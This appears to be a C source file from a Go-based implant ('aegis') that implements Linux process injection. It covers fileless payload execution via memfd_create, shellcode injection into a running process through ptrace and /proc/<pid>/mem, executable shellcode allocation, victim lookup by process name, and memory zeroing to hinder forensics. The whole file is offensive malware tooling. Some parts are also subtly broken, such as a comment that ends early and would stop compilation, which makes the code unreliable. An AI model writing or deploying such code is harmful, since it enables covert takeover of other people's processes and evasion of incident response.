/*
 * inject_linux.c — Linux process injection via:
 *   1. memfd_create + fexecve (fileless shellcode loader)
 *   2. /proc/<pid>/mem write (inject into running process)
 *   3. ptrace POKETEXT (classic ptrace injection)
 *
 * Compiled with CGO by Go build system.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>

/* memfd_create syscall number for x86_64 */
#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif

/*
 * aegis_memfd_exec — Execute shellcode in-memory using memfd_create.
 * The shellcode is never written to disk; it runs from an anonymous fd.
 *
 * Returns 0 on success, -1 on error.
 */
int aegis_memfd_exec(const unsigned char *shellcode, size_t len,
                     const char *fake_name)
{
    /* Create anonymous memory file */
    int fd = (int)syscall(SYS_memfd_create, fake_name ? fake_name : ".", MFD_CLOEXEC);
    if (fd < 0) {
        return -1;
    }

    /* Write shellcode to memfd */
    ssize_t written = write(fd, shellcode, len);
    if (written < 0 || (size_t)written != len) {
        close(fd);
        return -1;
    }

    /* Execute it via fexecve (no filesystem path) */
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    char *const argv[] = { (char *)fake_name, NULL };
    char *const envp[] = { NULL };

    execve(fd_path, argv, envp);
    /* If we reach here, execve failed */
    close(fd);
    return -1;
}

/*
 * aegis_proc_mem_inject — Inject shellcode into a target process via
 * /proc/<pid>/mem (requires ptrace attach).
 *
 * Steps:
 *   1. ptrace(ATTACH) to pause target
 *   2. Read registers to find RIP
 *   3. Write shellcode at RIP via /proc/<pid>/mem
 *   4. ptrace(DETACH) to resume
 *
 * Returns 0 on success, -1 on error.
 */
int aegis_proc_mem_inject(pid_t pid, const unsigned char *shellcode, size_t len)
{
    /* Attach */
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        return -1;
    }

    int status;
    if (waitpid(pid, &status, 0) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Get registers to find current instruction pointer */
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    unsigned long rip = (unsigned long)regs.rip;

    /* Write shellcode via /proc/<pid>/mem */
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    if (lseek(mem_fd, (off_t)rip, SEEK_SET) < 0) {
        close(mem_fd);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    ssize_t written = write(mem_fd, shellcode, len);
    close(mem_fd);

    if (written < 0 || (size_t)written != len) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Detach and let the target resume — it will now execute our shellcode */
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
        return -1;
    }

    return 0;
}

/*
 * aegis_shellcode_alloc — Allocate an executable anonymous memory region
 * and copy shellcode into it. Returns a function pointer ready to call,
 * or NULL on error.
 *
 * Caller must call aegis_shellcode_free() after execution completes.
 */
void *aegis_shellcode_alloc(const unsigned char *shellcode, size_t len)
{
    void *mem = mmap(NULL, len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    if (mem == MAP_FAILED) {
        return NULL;
    }
    memcpy(mem, shellcode, len);
    /* Memory barrier before execution */
    __builtin___clear_cache((char *)mem, (char *)mem + len);
    return mem;
}

/*
 * aegis_shellcode_free — Unmap a shellcode region allocated by aegis_shellcode_alloc.
 */
void aegis_shellcode_free(void *mem, size_t len)
{
    if (mem && mem != MAP_FAILED) {
        /* Zero before unmap to prevent memory forensics */
        memset(mem, 0, len);
        munmap(mem, len);
    }
}

/*
 * aegis_find_pid_by_name — Find PID of a running process by name.
 * Searches /proc/*/comm. Returns first match or -1.
 */
pid_t aegis_find_pid_by_name(const char *name)
{
    /* Walk /proc looking for comm matching name */
    char path[256];
    char comm[256];
    pid_t found = -1;

    /* Enumerate /proc entries */
    for (int pid = 2; pid < 65536; pid++) {
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        if (fgets(comm, sizeof(comm), f)) {
            /* Strip newline */
            size_t l = strlen(comm);
            if (l > 0 && comm[l-1] == '\n') comm[l-1] = '\0';
            if (strcmp(comm, name) == 0) {
                found = (pid_t)pid;
                fclose(f);
                break;
            }
        }
        fclose(f);
    }
    return found;
}
